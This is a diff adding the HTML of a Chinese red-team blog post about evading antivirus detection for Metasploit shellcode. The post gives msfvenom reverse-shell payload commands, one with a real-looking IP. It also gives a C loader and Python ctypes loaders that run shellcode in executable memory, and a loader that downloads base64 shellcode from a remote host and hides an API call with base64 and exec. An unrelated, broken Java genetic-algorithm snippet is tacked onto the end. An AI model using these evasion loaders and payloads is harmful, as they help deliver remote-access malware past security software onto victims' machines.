@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"topdayplus.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="源码免杀，CS、MSF等shellcode等免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀对抗之源码免杀">
+<meta property="og:url" content="http://topdayplus.github.io/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="Topday&#39;s Blog">
+<meta property="og:description" content="源码免杀，CS、MSF等shellcode等免杀">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-03T04:10:05.000Z">
+<meta property="article:modified_time" content="2022-09-15T13:48:34.846Z">
+<meta property="article:author" content="Topday">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://topdayplus.github.io/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://topdayplus.github.io/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/","path":"2022/09/03/免杀对抗之源码免杀/","title":"免杀对抗之源码免杀"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>免杀对抗之源码免杀 | Topday's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Topday's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Topday"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Topday</p>
+  <div class="site-description" itemprop="description">For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/topdayplus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;topdayplus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://topdayplus.github.io/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Topday">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Topday's Blog">
+      <meta itemprop="description" content="For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="免杀对抗之源码免杀 | Topday's Blog">
+      <meta itemprop="description" content="源码免杀，CS、MSF等shellcode等免杀">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          免杀对抗之源码免杀
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-09-03 12:10:05" itemprop="dateCreated datePublished" datetime="2022-09-03T12:10:05+08:00">2022-09-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-09-15 21:48:34" itemprop="dateModified" datetime="2022-09-15T21:48:34+08:00">2022-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F/" itemprop="url" rel="index"><span itemprop="name">红队</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">源码免杀，CS、MSF等shellcode等免杀</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><strong>0x01 免杀分类</strong></p>
+<p>渗透测试中常需要免杀马，这块的内容交叉且形式多样。常见的免杀方式，源码混淆、DLL文件替换、文件修改、加壳、花指令免杀、签名等。免杀的内容比较偏向破解、反编译范畴的安全研究，也是武器库中的必不可少的部分。本文章是系列教程，各种免杀方式都会涉及，本次分享的是源码免杀。</p>
+<p><strong>0x02 源码免杀</strong></p>
+<p>这里以Python做免杀为例，其他语言如C#、GO、Ruby等免杀思路相同。</p>
+<p>免杀的大致步骤可以分为如下，视情况可以采用部分步骤：</p>
+<ul>
+<li>加载器选择-ctypes-DLL&amp;其他，加载shellcode的组件</li>
+<li>加密器选择-base64&amp;hex&amp;xor&amp;aes，加密shellcode的组件、异或</li>
+<li>执行器选择-github上不是一大堆，用于执行shellcode的组件</li>
+<li>打包器选择-pyinstaller&amp;py2exe，把代码打包成可执行文件的组件</li>
+</ul>
+<p>免杀思路一：msf生成C语言shellcode，编写C程序调用shellcode生成exe可执行文件</p>
+<p>其实这部分无作任何免杀，只是换了调用方式，但还是能过电脑管家的（无语）</p>
+<p>msf操作步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#生成C语言shellcode，此处生成的shellcode是程序执行在内存中的状态</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=yourip lport=6688 -f c</span><br><span class="line">#监听主机上线</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6688</span><br></pre></td></tr></table></figure>
+
+<p>C语言调用二进制生成exe代码（需要采用32位执行）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此代码用于将msf生成的shellcode打包生成exe</span></span><br><span class="line"><span class="comment">//可能有同学要问了，为什么生成C语言的二进制码还需要利用C语言打包执行。其实exe程序运行时在内存中是二进制码，现在msf生成的是二进制码，需要打包成exe才能被执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="comment">//此处放msf生成的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    <span class="comment">// 申请EXECUTE属性内存</span></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 拷贝shellcode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>免杀思路二：利用msf生成加密的C语言shellcode，再利用python去调用（免杀思路一是采用C语言调用）</p>
+<p>python采用ctypes模块引用&amp;执行C语言代码</p>
+<p>此处讲解个Python调用C语言生成的动态链接库的小案例：</p>
+<p>vs生成dll文件小tips:（生成解决方案）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">TestCtypes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I like eating you\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python采用ctypes调用生成的dll文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#加载Dll1.dll</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./Dll1.dll&#x27;</span>)</span><br><span class="line"><span class="comment">#调用当前库方法</span></span><br><span class="line">lib.TestCtypes()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此处打包器选择pyinstaller</p>
+<p>msf生成base64加密shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=47.94.236.117 lport=6688 -f c</span><br></pre></td></tr></table></figure>
+
+<p>python调用Ctypes模块解码调用shellcode（注：此处python必须为32位的）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处为msf生成的加密shellcode,去掉&quot;和;</span></span><br><span class="line">encode_shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行shellcode</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>pyinstaller.exe -F -w miansha-df.py #用于将py文件生成exe文件  （注：此处python必须为32位的）</p>
+<p>免杀思路三：外部shellcode加载+特征语句定位加密（过hr、360）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#外部请求shellcode</span></span><br><span class="line">encode_shellcode = requests.get(<span class="string">&quot;http://yourip/123.txt&quot;</span>).text</span><br><span class="line"><span class="comment">#解密shellcode</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#此处为ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))原语句base64加密</span></span><br><span class="line">func=base64.b64decode(<span class="string">b&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(func)</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意点：</p>
+<p>1.python执行C语言shellcode时需要使用python3 32位，打包成exe文件也需要使用32位的，win10上打包生成的exe在win7环境下会报错，要选择相应版本打包。</p>
+<p>2.msf生成shellcode时，有无base64加密生成的shellcode形式相似，类似”x2f\x4f\x69\x50\x41”</p>
+<p>​	2.1.本文中默认生成的shellcode是C语言shellcode码，是把byte码用十六进制来表示</p>
+<p>​	2.2.添加base64加密生成的是base64加密的shellcode，同样是把byte码用十六进制来表示。在调用时需要把十六进制转化为字符串，为了方便起见，免杀思路三中的放在服务器上的123.txt在十六进制转换的字符串，便于操作，否则需要本地再次转换。</p>
+<p>附带科普下，内存运行编码的各种概念。</p>
+<p>内存大小是使用byte为单位的，msf生成的byte码是执行在内存时的编码，为16进制，而python在打印时会自动将十六进制编码转换为字符串，下面的python代码打印的结果为AVlNXa。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="string">&quot;\x41\x56\x6c\x4e\x58\x61&quot;</span></span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>
+
+<p>0X1 &#x3D; 1byte<br>0X10 &#x3D; 16 byte<br>0X100 &#x3D; 16<em>16 byte &#x3D; 256 byte<br>0X1000 &#x3D; 16 <em>256 byte&#x3D; 4 * ( 4 * 256byte) &#x3D; 4 * 1024 byte &#x3D;4K byte<br>0X1 0000 &#x3D; 16 * 4K byte &#x3D; 64K byte<br>0X10 0000 &#x3D; 16 * 64K byte &#x3D; 1024K byte &#x3D; 1M byte<br>0X100 0000 &#x3D; 16 * 1M byte &#x3D; 16M byte<br>0X1000 0000 &#x3D; 16 * 16M byte &#x3D; 256M byte<br>0X1 0000 0000 &#x3D; 16 * 256Mbyte &#x3D; 4</em>(4</em>256) Mbyte &#x3D; 4*1024Mbyte&#x3D;4Gbyte</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Pop <span class="title function_">evPop</span><span class="params">(Pop pop, RuleBean rule)</span> &#123;</span><br><span class="line">	<span class="type">Pop</span> <span class="variable">new1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pop</span>(pop.getLength());</span><br><span class="line">	<span class="type">int</span> elitismO;</span><br><span class="line">	<span class="keyword">if</span> (elitism) &#123;</span><br><span class="line">			elitismO = <span class="number">1</span>;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">fit</span> <span class="operator">=</span> pop.getFitness();</span><br><span class="line">			fit.setId(<span class="number">0</span>);</span><br><span class="line">			new1.setPaper(<span class="number">0</span>, fitness);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismO; i &lt; new1.getLength(); i++) &#123;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent1</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent2</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="keyword">while</span> (parent2.getId() == parent1.getId()) &#123;</span><br><span class="line">				parent2 = select(pop);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">child</span> <span class="operator">=</span> crossover(parent1, parent2, rule);</span><br><span class="line">			child.setId(i);</span><br><span class="line">			newPopulation.setPaper(i, child);</span><br><span class="line">		&#125;</span><br><span class="line">    	Paper tmpPaper;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismOffset; i &lt; newPopulation.getLength(); i++) &#123;</span><br><span class="line">			tmpPaper = new1.getPaper(i);</span><br><span class="line">			mutate(tmpPaper);</span><br><span class="line">			tmpPaper.setKpCoverage(rule);</span><br><span class="line">			tmpPaper.setAdaptationDegree(rule, Global.KP_WEIGHT, Global.DIFFCULTY_WEIGHt);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> new1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+	
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Topday
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://topdayplus.github.io/2022/09/03/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E4%B9%8B%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80/" title="免杀对抗之源码免杀">http://topdayplus.github.io/2022/09/03/免杀对抗之源码免杀/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/03/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="prev" title="CRLF注入漏洞">
+                  <i class="fa fa-chevron-left"></i> CRLF注入漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/03/%E5%9B%BD%E5%86%85DCS%E7%B3%BB%E7%BB%9F%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6/" rel="next" title="国内DCS系统发展现状">
+                  国内DCS系统发展现状 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Topday</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">266k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:02</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
